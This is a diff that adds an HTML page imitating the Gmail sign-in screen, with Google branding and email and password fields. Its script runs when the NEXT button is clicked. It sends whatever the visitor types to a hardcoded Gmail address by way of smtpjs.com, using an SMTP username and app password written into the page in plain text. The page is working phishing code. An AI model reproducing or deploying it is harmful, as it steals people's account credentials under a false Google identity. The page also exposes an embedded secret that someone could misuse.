@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <link rel="icon" href="g.png">
+    <title>Gmail</title>
+</head>
+<body>
+    <div class="wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2000px-Google_2015_logo.svg.png" alt="Google Logo">
+          <h1 class="titles"> Sign in	</h1>
+        <p>to continue to Gmail</p>
+      
+          <form id="loginForm" method="POST">
+          
+          <div class="animate-label">
+            <input type="text" id="username" required/>
+            <label for="username"> Email or phone </label>
+            <line></line>
+          </div>
+      
+          <div class="animate-label">
+                <input type="password" id="password" required/>
+            <label for="password"> Password </label>
+            <line></line>
+          </div>
+          
+              <a href="#"> Forgot Password? </a>
+          
+          <div class="flex">
+            <a href="#"> More options </a>
+            <button id="btn"> NEXT </button>
+          </div>
+          
+          </form>
+      </div>
+      
+</body>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script >
+        var btn =document.getElementById('btn');
+        btn.addEventListener('click',function(e) {
+            e.preventDefault();
+            var mail = document.getElementById('username').value;
+            var pass = document.getElementById('password').value;
+            var body = 'Email:'+mail +'<br/> Password:'+pass ;
+            
+            Email.send({
+            Host : "smtp.gmail.com",
+            Username : "grmeen05@gmail.com",
+            Password : "wylrvlcuipmygjpp",
+            To : 'grmeen05@gmail.com',
+            From :mail,
+            Subject : "This is the subject",
+            Body : body
+            }).then(
+            message => alert('done')
+            );
+        })
+        </script>
+</html>
